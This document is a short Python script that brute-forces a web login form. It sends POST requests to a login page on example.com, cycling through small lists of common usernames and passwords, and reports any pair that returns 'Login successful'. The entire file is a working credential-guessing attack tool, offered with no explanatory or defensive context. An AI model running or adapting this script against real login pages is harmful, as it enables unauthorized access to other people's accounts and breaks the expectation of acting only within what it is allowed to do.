import requests

TARGET_URL = 'http://example.com/login.php'

usernames = ['admin', 'user1', 'test']
passwords = ['password', '123456', 'admin', 'test']

def brute_force_login(url):
    for username in usernames:
        for password in passwords:
            # Data dictionary for POST request
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if "Login successful" in response.text:
                print(f"Success! Username: {username}, Password: {password}")
                return username, password
    print("Failed to find a working combination.")
    return None, None

if __name__ == "__main__":
    brute_force_login(TARGET_URL)
